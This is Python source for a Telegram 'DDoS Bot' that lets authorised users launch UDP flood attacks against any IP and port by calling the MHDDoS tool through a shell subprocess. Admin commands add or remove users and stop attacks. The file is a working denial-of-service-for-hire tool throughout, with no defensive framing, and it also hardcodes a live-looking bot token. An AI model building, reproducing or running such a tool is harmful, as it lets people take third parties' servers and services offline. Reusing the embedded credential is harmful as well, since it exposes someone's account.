import asyncio
import os
import signal
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = "7567539745:AAGOtQ0lpSongyREoFg5O4fjgEcC9qTSIrk"
ADMIN_USER_ID = 1079503726  # Change this to your Telegram user ID
USERS_FILE = "users.txt"
attack_in_progress = False
attack_process = None  # Store the process running the attack

# Load allowed users from file
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, "w") as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to DDoS Bot 🔥*\n"
        "*🔥 Use /attack <ip:port> <time> <threads> to launch an attack*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /manage add|rem <user_id>*", parse_mode="Markdown")
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == "add":
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode="Markdown")
    elif command == "rem":
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode="Markdown")

async def run_attack(chat_id, ip, port, time, threads, context):
    global attack_in_progress, attack_process
    attack_in_progress = True

    try:
        attack_process = await asyncio.create_subprocess_shell(
            f"python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} {threads} {time}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await attack_process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode="Markdown")

    finally:
        attack_in_progress = False
        attack_process = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode="Markdown")

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ An attack is already running! Wait before starting a new one.*", parse_mode="Markdown")
        return

    if len(args) < 2 or len(args) > 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip:port> <time> [threads]*", parse_mode="Markdown")
        return

    match = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", args[0])
    if not match:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP:Port format. Use 103.219.202.12:10016*", parse_mode="Markdown")
        return

    ip = match.group(1)
    port = match.group(2)
    time = args[1]
    threads = args[2] if len(args) == 3 else "1"  # Default threads to 1

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Attack started on {ip}:{port} for {time} seconds with {threads} threads!*", parse_mode="Markdown")

    asyncio.create_task(run_attack(chat_id, ip, port, time, threads, context))

async def stop(update: Update, context: CallbackContext):
    global attack_in_progress, attack_process

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id != str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
        return

    if not attack_in_progress or attack_process is None:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack is running!*", parse_mode="Markdown")
        return

    try:
        # First, send SIGINT (CTRL+C)
        os.kill(attack_process.pid, signal.SIGINT)
        await asyncio.sleep(1)  # Give time for graceful shutdown

        # If still running, force kill
        if attack_process.returncode is None:
            os.kill(attack_process.pid, signal.SIGKILL)

        attack_in_progress = False
        attack_process = None

        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Stopped!*", parse_mode="Markdown")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error Stopping Attack: {str(e)}*", parse_mode="Markdown")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.run_polling()

if __name__ == "__main__":
    main()